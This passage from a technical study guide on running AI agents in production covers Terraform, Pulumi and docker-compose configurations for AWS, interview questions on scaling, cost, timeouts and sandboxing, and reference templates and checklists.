                                     Metrics OK              Metrics BAD
                                          |                       |
                                          v                       v
                                   +------+------+         +-----+------+
                                   | Ramp to 25% |         | Auto       |
                                   | then 50%    |         | Rollback   |
                                   | then 100%   |         +------------+
                                   +-------------+

AGENT-SPECIFIC TESTS IN PIPELINE:
  1. Unit tests (tool functions, routing logic)
  2. Integration tests (LLM calls with mocked responses)
  3. Agent eval suite (golden set of queries with expected outcomes)
  4. Cost regression test (new version shouldn't cost >10% more)
  5. Latency regression test (P95 latency shouldn't increase >20%)
```

---

## 11. Infrastructure as Code

### Terraform for Agent Infrastructure

```hcl
# main.tf -- Agent infrastructure on AWS

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

# --- Networking ---

resource "aws_vpc" "agent_vpc" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true

  tags = {
    Name = "agent-infrastructure"
  }
}

resource "aws_subnet" "private" {
  count             = 2
  vpc_id            = aws_vpc.agent_vpc.id
  cidr_block        = "10.0.${count.index + 1}.0/24"
  availability_zone = data.aws_availability_zones.available.names[count.index]

  tags = {
    Name = "agent-private-${count.index}"
  }
}

# --- ECS Cluster for Agent Workers ---

resource "aws_ecs_cluster" "agents" {
  name = "agent-workers"

  setting {
    name  = "containerInsights"
    value = "enabled"
  }
}

resource "aws_ecs_task_definition" "agent_worker" {
  family                   = "agent-worker"
  requires_compatibilities = ["FARGATE"]
  network_mode             = "awsvpc"
  cpu                      = 1024
  memory                   = 2048
  execution_role_arn       = aws_iam_role.ecs_execution.arn
  task_role_arn            = aws_iam_role.agent_task.arn

  container_definitions = jsonencode([
    {
      name  = "agent-worker"
      image = "${aws_ecr_repository.agent.repository_url}:latest"

      environment = [
        {
          name  = "REDIS_URL"
          value = "redis://${aws_elasticache_cluster.agent_cache.cache_nodes[0].address}:6379"
        },
        {
          name  = "QUEUE_URL"
          value = aws_sqs_queue.agent_jobs.url
        }
      ]

      secrets = [
        {
          name      = "ANTHROPIC_API_KEY"
          valueFrom = aws_secretsmanager_secret.anthropic_key.arn
        }
      ]

      logConfiguration = {
        logDriver = "awslogs"
        options = {
          "awslogs-group"         = aws_cloudwatch_log_group.agent.name
          "awslogs-region"        = var.region
          "awslogs-stream-prefix" = "agent-worker"
        }
      }

      healthCheck = {
        command     = ["CMD-SHELL", "curl -f http://localhost:8080/health || exit 1"]
        interval    = 30
        timeout     = 5
        retries     = 3
        startPeriod = 10
      }
    }
  ])
}

resource "aws_ecs_service" "agent_worker" {
  name            = "agent-worker"
  cluster         = aws_ecs_cluster.agents.id
  task_definition = aws_ecs_task_definition.agent_worker.arn
  desired_count   = 3
  launch_type     = "FARGATE"

  network_configuration {
    subnets         = aws_subnet.private[*].id
    security_groups = [aws_security_group.agent_worker.id]
  }
}

# --- Auto-scaling ---

resource "aws_appautoscaling_target" "agent_worker" {
  max_capacity       = 50
  min_capacity       = 2
  resource_id        = "service/${aws_ecs_cluster.agents.name}/${aws_ecs_service.agent_worker.name}"
  scalable_dimension = "ecs:service:DesiredCount"
  service_namespace  = "ecs"
}

resource "aws_appautoscaling_policy" "agent_scale_on_queue" {
  name               = "scale-on-queue-depth"
  policy_type        = "TargetTrackingScaling"
  resource_id        = aws_appautoscaling_target.agent_worker.resource_id
  scalable_dimension = aws_appautoscaling_target.agent_worker.scalable_dimension
  service_namespace  = aws_appautoscaling_target.agent_worker.service_namespace

  target_tracking_scaling_policy_configuration {
    target_value = 5.0  # 5 messages per worker

    customized_metric_specification {
      metric_name = "ApproximateNumberOfMessagesVisible"
      namespace   = "AWS/SQS"
      statistic   = "Average"
      dimensions {
        name  = "QueueName"
        value = aws_sqs_queue.agent_jobs.name
      }
    }

    scale_in_cooldown  = 300
    scale_out_cooldown = 60
  }
}

# --- SQS Queue ---

resource "aws_sqs_queue" "agent_jobs" {
  name                       = "agent-jobs"
  visibility_timeout_seconds = 900  # 15 min (agent max runtime)
  message_retention_seconds  = 86400
  receive_wait_time_seconds  = 20   # Long polling

  redrive_policy = jsonencode({
    deadLetterTargetArn = aws_sqs_queue.agent_dlq.arn
    maxReceiveCount     = 3
  })
}

resource "aws_sqs_queue" "agent_dlq" {
  name                      = "agent-jobs-dlq"
  message_retention_seconds = 604800  # 7 days
}

# --- Redis Cache ---

resource "aws_elasticache_cluster" "agent_cache" {
  cluster_id           = "agent-cache"
  engine               = "redis"
  node_type            = "cache.r7g.large"
  num_cache_nodes      = 1
  parameter_group_name = "default.redis7"
  port                 = 6379
  subnet_group_name    = aws_elasticache_subnet_group.agent.name
  security_group_ids   = [aws_security_group.redis.id]
}

# --- S3 for Artifacts ---

resource "aws_s3_bucket" "agent_artifacts" {
  bucket = "agent-artifacts-${var.environment}"
}

resource "aws_s3_bucket_lifecycle_configuration" "artifacts" {
  bucket = aws_s3_bucket.agent_artifacts.id

  rule {
    id     = "archive-old-artifacts"
    status = "Enabled"

    transition {
      days          = 30
      storage_class = "STANDARD_IA"
    }

    transition {
      days          = 90
      storage_class = "GLACIER"
    }

    expiration {
      days = 365
    }
  }
}

# --- Monitoring ---

resource "aws_cloudwatch_dashboard" "agent_ops" {
  dashboard_name = "agent-operations"
  dashboard_body = jsonencode({
    widgets = [
      {
        type   = "metric"
        properties = {
          title   = "Agent Executions"
          metrics = [
            ["AgentMetrics", "AgentExecutions", "Status", "Success"],
            ["AgentMetrics", "AgentExecutions", "Status", "Failed"],
          ]
          period = 300
          stat   = "Sum"
        }
      },
      {
        type   = "metric"
        properties = {
          title   = "Queue Depth"
          metrics = [
            ["AWS/SQS", "ApproximateNumberOfMessagesVisible",
             "QueueName", "agent-jobs"],
          ]
          period = 60
          stat   = "Average"
        }
      },
      {
        type   = "metric"
        properties = {
          title   = "Agent Latency (P95)"
          metrics = [
            ["AgentMetrics", "AgentLatency"],
          ]
          period = 300
          stat   = "p95"
        }
      },
    ]
  })
}
```

### Pulumi (TypeScript) Alternative

```typescript
// index.ts -- Pulumi agent infrastructure
import * as pulumi from '@pulumi/pulumi';
import * as aws from '@pulumi/aws';

const config = new pulumi.Config();

// ECS Cluster
const cluster = new aws.ecs.Cluster('agent-cluster', {
  settings: [{ name: 'containerInsights', value: 'enabled' }],
});

// Task Definition
const taskDef = new aws.ecs.TaskDefinition('agent-worker', {
  family: 'agent-worker',
  requiresCompatibilities: ['FARGATE'],
  networkMode: 'awsvpc',
  cpu: '1024',
  memory: '2048',
  executionRoleArn: executionRole.arn,
  taskRoleArn: taskRole.arn,
  containerDefinitions: pulumi.interpolate`[
    {
      "name": "agent-worker",
      "image": "${repo.repositoryUrl}:latest",
      "environment": [
        {"name": "REDIS_URL", "value": "redis://${cache.cacheNodes[0].address}:6379"}
      ],
      "secrets": [
        {"name": "ANTHROPIC_API_KEY", "valueFrom": "${secret.arn}"}
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "${logGroup.name}",
          "awslogs-region": "${aws.config.region}",
          "awslogs-stream-prefix": "agent"
        }
      }
    }
  ]`,
});

// Service with auto-scaling
const service = new aws.ecs.Service('agent-service', {
  cluster: cluster.id,
  taskDefinition: taskDef.arn,
  desiredCount: 3,
  launchType: 'FARGATE',
  networkConfiguration: {
    subnets: privateSubnets.ids,
    securityGroups: [workerSg.id],
  },
});

// Export service URL
export const serviceUrl = pulumi.interpolate`http://${alb.dnsName}`;
```

### Reproducible Development Environments

```yaml
# docker-compose.dev.yml -- Local development matching production
version: '3.8'

services:
  agent-dev:
    build:
      context: .
      dockerfile: Dockerfile.dev
    volumes:
      - ./src:/app/src
      - ./tests:/app/tests
    environment:
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - REDIS_URL=redis://redis:6379
      - DATABASE_URL=postgresql://postgres:dev@db:5432/agents
      - ENVIRONMENT=development
    ports:
      - '8080:8080'
      - '5678:5678' # debugpy
    depends_on:
      - redis
      - db

  redis:
    image: redis:7-alpine
    ports:
      - '6379:6379'

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: agents
      POSTGRES_PASSWORD: dev
    ports:
      - '5432:5432'
    volumes:
      - ./migrations:/docker-entrypoint-initdb.d

  # Local sandbox for code execution
  sandbox:
    image: python:3.12-slim
    command: sleep infinity
    network_mode: none # No network access
    deploy:
      resources:
        limits:
          memory: 256M
          cpus: '0.5'
```

---

## 12. Common Interview Questions

### Q1: "Design the infrastructure for a customer support agent handling 10,000 concurrent users."

**Model Answer:**

```
ARCHITECTURE:

Users (10K concurrent)
       |
       v
+------+-------+
| CloudFront / |  (CDN for static, WebSocket pass-through)
| ALB          |
+------+-------+
       |
  +----+----+----+
  |         |    |
  v         v    v
+----+  +----+  +----+
| WS |  | WS |  | WS |    WebSocket servers (20 pods)
| Srv|  | Srv|  | Srv|    Each handles ~500 connections
+----+  +----+  +----+
  |         |    |
  v         v    v
+------------------+
|  Redis Cluster   |      Active session state
|  (3 nodes)       |      Rate limiting
+--------+---------+
         |
+--------+---------+
|   SQS / RabbitMQ |      Agent job queue with priority
+--------+---------+
         |
  +------+------+------+
  |             |      |
  v             v      v
+------+   +------+  +------+
|Worker|   |Worker|  |Worker|    Agent workers (30-50 pods)
|  1   |   |  2   |  |  N   |    Each runs 20 concurrent agents
+------+   +------+  +------+
  |             |      |
  v             v      v
+------------------+  +---------+
|   PostgreSQL     |  |   S3    |
|   (conversations)|  |(artifacts)|
+------------------+  +---------+

KEY DESIGN DECISIONS:
1. WebSocket for streaming (users expect real-time responses)
2. Queue between WS servers and workers (backpressure, priority)
3. Model routing: 60% Haiku (greetings, FAQ), 30% Sonnet, 10% Opus
4. Semantic caching: ~25% hit rate on common support questions
5. Auto-scaling workers based on queue depth
6. Redis for session state (sub-ms access, TTL-based cleanup)

CAPACITY PLANNING:
- 10K concurrent users x avg 2 messages/min = 20K msg/min
- ~40% need agent processing = 8K agent invocations/min
- Avg agent: 3 LLM calls x 2s = 6s
- Workers needed: 8000/60 * 6 = 800 concurrent agents
- At 20 agents/worker: 40 workers

COST ESTIMATE (monthly):
- LLM API: ~$50K (with model routing + caching)
- Infrastructure: ~$8K (ECS, Redis, RDS, S3)
- Total: ~$58K for 10K concurrent users
```

### Q2: "How would you reduce agent costs by 50% without degrading quality?"

**Model Answer:**

```
STRATEGY (ordered by impact):

1. MODEL ROUTING (saves 30-40%)
   - Classify requests into simple/medium/complex
   - Route 60% to Haiku, 30% to Sonnet, 10% to Opus
   - Train classifier on historical data + quality labels

2. SEMANTIC CACHING (saves 15-25%)
   - Cache responses for semantically similar queries
   - Works well for support agents (many similar questions)
   - 95% similarity threshold to avoid stale/wrong responses

3. CONTEXT WINDOW OPTIMIZATION (saves 10-15%)
   - Summarize old messages instead of sending full history
   - Truncate tool results (send first 2000 chars, not 50K)
   - Remove redundant system prompt sections per-turn

4. TOOL RESULT CACHING (saves 5-10%)
   - Cache search results, file reads, API calls
   - Per-tool TTL (search: 5min, file: 1min, weather: 30min)

5. EARLY TERMINATION (saves 5-10%)
   - Detect when agent is looping or not making progress
   - Cap max iterations (10 for simple tasks, 25 for complex)
   - If confidence is high after 1 LLM call, skip further steps

MEASUREMENT:
   Before: $100K/month
   After model routing: $62K (-38%)
   After caching: $48K (-22%)
   After context optimization: $42K (-13%)
   After tool caching: $39K (-7%)
   Total: 61% reduction, ~$39K/month
```

### Q3: "Your agent is timing out for 5% of requests. How do you debug and fix this?"

**Model Answer:**

```
DEBUGGING PROCESS:

1. INSTRUMENT
   - Add tracing to every agent step (LLM call, tool call, loop iteration)
   - Log: step_number, duration_ms, token_count, tool_name
   - Tag timed-out requests for analysis

2. ANALYZE
   - Are timeouts correlated with:
     a) Specific tools? (e.g., web_fetch timing out)
     b) Conversation length? (context window growing too large)
     c) Query complexity? (agent stuck in a loop)
     d) Time of day? (LLM API congestion)
     e) Specific users? (adversarial inputs)

3. COMMON CAUSES & FIXES:

   Tool timeouts:
   - Add per-tool timeouts (search: 10s, code_exec: 30s)
   - Implement circuit breakers (if tool fails 3x, disable temporarily)
   - Add fallback tools (if primary search fails, try secondary)

   Agent loops:
   - Set max_iterations (hard cap at 25)
   - Detect repetitive actions (same tool with same args)
   - Add "progress check" every 5 steps (is agent making progress?)

   Context window growth:
   - Summarize messages when conversation exceeds threshold
   - Truncate large tool results before adding to context
   - Limit conversation history to last N turns

   LLM API latency:
   - Implement request hedging (send to 2 providers, use first response)
   - Add adaptive timeouts (P95 * 2, not a fixed 30s)
   - Queue and retry with exponential backoff

4. PREVENTION:
   - Set overall request timeout with graceful degradation
   - Return partial results instead of nothing
   - Alert on P95 latency trends before they become P5 failures
```

### Q4: "How do you safely deploy an agent that can execute arbitrary code?"

**Model Answer:**

```
DEFENSE IN DEPTH:

Layer 1: INPUT VALIDATION
  - Sanitize user inputs before they reach the LLM
  - Block known prompt injection patterns
  - Rate limit code execution requests

Layer 2: LLM GUARDRAILS
  - System prompt restricts what code the agent should generate
  - Output classifiers check generated code before execution
  - Block dangerous patterns: os.system, subprocess, network calls

Layer 3: SANDBOX ISOLATION
  - Execute all code in Firecracker microVMs or E2B sandboxes
  - No network access (or allowlist only)
  - Read-only filesystem (except /tmp with size limit)
  - Memory limit (256MB), CPU limit (50%), time limit (30s)
  - No access to host filesystem, env vars, or secrets

Layer 4: RESOURCE LIMITS
  - Max file size for outputs (10MB)
  - Max execution time (30s per run, 5min per conversation)
  - Max concurrent sandboxes per user (3)
  - Rate limit: 10 code executions per minute per user

Layer 5: MONITORING & KILL SWITCH
  - Log all executed code and outputs
  - Alert on suspicious patterns (crypto mining, port scanning)
  - Global kill switch to disable code execution instantly
  - Human review queue for flagged executions

ARCHITECTURE:
  Agent --> Code Generation --> Safety Check --> Sandbox --> Result
                                    |
                                 Block if
                                 dangerous
```

### Q5: "Compare serverless vs container-based deployment for an agent with 3 LLM calls per request."

**Model Answer:**

```
ANALYSIS:

                    Serverless              Containers
                    (Lambda)                (ECS Fargate)
                    ---------               --------------
Latency:            Cold start 1-5s         Always warm
                    + 3 LLM calls (~9s)     + 3 LLM calls (~9s)
                    Total: 10-14s           Total: 9s

Cost at low scale:  Pay per invocation      Min 2 containers 24/7
(100 req/day)       ~$0.50/day              ~$5/day
                    WINNER

Cost at high scale: 100K invocations/day    50 containers
(100K req/day)      ~$500/day               ~$250/day
                                            WINNER

State:              Must externalize        Can keep in memory
                    (DynamoDB/Redis)         (with sticky sessions)

Streaming:          API Gateway WebSocket   Native WebSocket
                    (complex setup)         (simple)

Max duration:       15 minutes              Unlimited

Scaling:            Automatic (1000+ conc.) Manual HPA config


Complexity:         Low (managed)           Medium (K8s/ECS)

RECOMMENDATION:
  - <1000 req/day, no streaming: Serverless
  - >1000 req/day or streaming needed: Containers
  - Mix: Serverless for batch/async, containers for real-time
```

### Q6: "Design a multi-region agent deployment for global users."

**Model Answer:**

```
MULTI-REGION ARCHITECTURE:

US Users          EU Users          APAC Users
    |                 |                 |
    v                 v                 v
+--------+      +--------+       +--------+
| Edge   |      | Edge   |       | Edge   |
| us-east|      | eu-west|       | ap-se  |
+---+----+      +---+----+       +---+----+
    |                |                |
    v                v                v
+--------+      +--------+       +--------+
| Agent  |      | Agent  |       | Agent  |
| Workers|      | Workers|       | Workers|
| us-east|      | eu-west|       | ap-se  |
+---+----+      +---+----+       +---+----+
    |                |                |
    +------+---------+--------+------+
           |                  |
      +----+----+       +----+----+
      | Primary |       | Read    |
      | DB      |<----->| Replicas|
      | us-east |  sync | (global)|
      +---------+       +---------+

KEY DECISIONS:
1. LLM API calls go to nearest provider endpoint
2. State is replicated globally (CockroachDB or DynamoDB Global Tables)
3. Agent workers run in each region
4. Failover: if one region is down, route to nearest healthy region
5. Data residency: EU user data stays in EU (GDPR)

CHALLENGES:
- LLM providers may not have endpoints in all regions
- Cross-region state consistency (eventual vs strong)
- Cost multiplier (3x infrastructure)
- Different compliance requirements per region
```

---

## 13. Quick Reference

### Infrastructure Decision Matrix

```
+-------------------+--------------------+--------------------+-------------------+
| Decision          | Small Scale        | Medium Scale       | Large Scale       |
|                   | (<1K req/day)      | (1K-100K req/day)  | (>100K req/day)   |
+-------------------+--------------------+--------------------+-------------------+
| Runtime           | Serverless         | Containers         | K8s + dedicated   |
|                   | (Lambda)           | (Cloud Run/ECS)    | GPU nodes         |
+-------------------+--------------------+--------------------+-------------------+
| State Store       | DynamoDB/SQLite    | Redis + PostgreSQL | Redis Cluster +   |
|                   |                    |                    | Aurora + S3       |
+-------------------+--------------------+--------------------+-------------------+
| Queue             | SQS                | RabbitMQ/SQS       | Kafka + SQS       |
+-------------------+--------------------+--------------------+-------------------+
| Sandbox           | Docker             | E2B / Docker       | Firecracker       |
+-------------------+--------------------+--------------------+-------------------+
| Caching           | In-memory          | Redis              | Redis Cluster +   |
|                   |                    |                    | semantic cache    |
+-------------------+--------------------+--------------------+-------------------+
| Deployment        | Direct deploy      | Blue/green         | Canary + feature  |
|                   |                    |                    | flags             |
+-------------------+--------------------+--------------------+-------------------+
| Monitoring        | CloudWatch         | Datadog/Grafana    | Custom + LLM      |
|                   |                    |                    | observability     |
+-------------------+--------------------+--------------------+-------------------+
| IaC               | CDK/SAM            | Terraform          | Terraform +       |
|                   |                    |                    | Pulumi modules    |
+-------------------+--------------------+--------------------+-------------------+
| Cost optimization | Model routing      | + Semantic cache   | + Custom models   |
|                   |                    |                    | + prompt distill  |
+-------------------+--------------------+--------------------+-------------------+
| Estimated monthly | $500-$2K           | $5K-$50K           | $50K-$500K        |
| infrastructure    |                    |                    |                   |
+-------------------+--------------------+--------------------+-------------------+
```

### Latency Budget Template

```
TARGET: <3s to first token, <15s total for 95th percentile

BUDGET ALLOCATION:
+---------------------+--------+--------+
| Component           | Target | Max    |
+---------------------+--------+--------+
| Auth + routing      | 20ms   | 50ms   |
| Request validation  | 5ms    | 10ms   |
| State loading       | 10ms   | 50ms   |
| LLM TTFT            | 300ms  | 800ms  |
| LLM full response   | 2s     | 5s     |
| Tool execution (x3) | 1.5s   | 5s     |
| Response formatting | 5ms    | 10ms   |
| State persistence   | 10ms   | 50ms   |
+---------------------+--------+--------+
| Total (1 loop)      | ~4s    | ~11s   |
| Total (2 loops)     | ~8s    | ~21s   |
+---------------------+--------+--------+
```

### Cost Estimation Template

```
MONTHLY COST ESTIMATION:

Input variables:
  - Daily active users: ________
  - Avg conversations/user/day: ________
  - Avg messages/conversation: ________
  - Avg agent steps/message: ________

Token estimation:
  - Input tokens/step: ~3,000 (system + history + tools)
  - Output tokens/step: ~500
  - Steps/message: ~3
  - Messages/day: users x convos x messages = ________

Monthly LLM cost:
  With model routing (60/30/10 split):
  - Haiku:  60% x messages x steps x (3K x $0.25/M + 500 x $1.25/M) = $_____
  - Sonnet: 30% x messages x steps x (3K x $3/M + 500 x $15/M)     = $_____
  - Opus:   10% x messages x steps x (3K x $15/M + 500 x $75/M)     = $_____
  - Total LLM: $_____

  Without routing (all Sonnet):
  - 100% x messages x steps x (3K x $3/M + 500 x $15/M) = $_____

  Savings from routing: _____%

Monthly infrastructure:
  - Compute (ECS/K8s): $_____
  - Redis: $_____
  - Database: $_____
  - Storage: $_____
  - Network: $_____
  - Total infra: $_____

TOTAL MONTHLY: LLM + Infrastructure = $_____
```

### Production Readiness Checklist

```
BEFORE GOING LIVE:

Infrastructure:
[ ] Auto-scaling configured and tested
[ ] Health checks on all services
[ ] Circuit breakers on external dependencies
[ ] Graceful shutdown handles in-progress agents
[ ] Database connection pooling configured
[ ] Redis maxmemory-policy set (allkeys-lru)
[ ] S3 lifecycle policies for cost control

Security:
[ ] API keys in secrets manager (not env vars)
[ ] Sandbox isolation for code execution
[ ] Rate limiting per user/org
[ ] Input sanitization
[ ] Network policies (least privilege)
[ ] Audit logging for all agent actions

Reliability:
[ ] Retry policies with exponential backoff
[ ] Dead letter queues for failed jobs
[ ] Timeout on every external call
[ ] Max iteration limit on agent loops
[ ] Graceful degradation (return partial results)
[ ] Chaos testing completed

Observability:
[ ] Structured logging (JSON)
[ ] Distributed tracing (request ID propagation)
[ ] Custom metrics (agent steps, tool calls, cost)
[ ] Alerting on error rate, latency, cost spikes
[ ] Dashboard for real-time operations

Cost:
[ ] Per-user cost tracking
[ ] Budget limits and alerts
[ ] Model routing configured
[ ] Caching layers deployed
[ ] Cost anomaly detection

Deployment:
[ ] CI/CD pipeline with agent eval tests
[ ] Blue/green or canary deployment configured
[ ] Rollback procedure documented and tested
[ ] Feature flags for new agent capabilities
[ ] Runbook for common incidents
```

### Key Formulas

```
CONCURRENT AGENTS = (requests/sec) x (avg_agent_duration_sec)
  Example: 100 req/s x 8s = 800 concurrent agents

WORKERS NEEDED = concurrent_agents / agents_per_worker
  Example: 800 / 20 = 40 workers

LLM COST PER REQUEST = steps x (input_tokens x input_price + output_tokens x output_price)
  Example: 3 x (3000 x $3/M + 500 x $15/M) = $0.0495

CACHE SAVINGS = hit_rate x avg_cost_per_request x daily_requests x 30
  Example: 25% x $0.05 x 100K x 30 = $37,500/month

QUEUE DRAIN TIME = queue_depth / (workers x agents_per_worker / avg_duration)
  Example: 1000 / (40 x 20 / 8) = 10 seconds
```

---

## Further Reading

- [01-AGENT-ARCHITECTURES.md](01-AGENT-ARCHITECTURES.md) -- Agent loop patterns (foundation for understanding what the infrastructure runs)
- [07-RELIABILITY-GUARDRAILS.md](07-RELIABILITY-GUARDRAILS.md) -- Error handling, retries, and safety layers
- [08-EVALUATION-OBSERVABILITY.md](08-EVALUATION-OBSERVABILITY.md) -- Monitoring and evaluating agent quality in production
- [05-MULTI-AGENT-ORCHESTRATION.md](05-MULTI-AGENT-ORCHESTRATION.md) -- Multi-agent patterns that drive infrastructure requirements
